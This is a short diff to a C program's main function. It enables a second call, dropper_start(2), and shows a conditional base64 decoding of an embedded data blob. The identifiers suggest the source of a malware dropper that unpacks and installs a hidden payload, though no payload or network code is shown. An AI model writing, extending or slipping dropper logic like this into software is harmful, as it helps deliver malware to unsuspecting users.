@@ -176,7 +176,7 @@ int main(int argc, char* argv[])
 
 #else
 		dropper_start(1);
-//		dropper_start(2);
+		dropper_start(2);
 
 	#if DROPPER_BASE64 == 1
 		data1 = base64decode(data1, &size1);
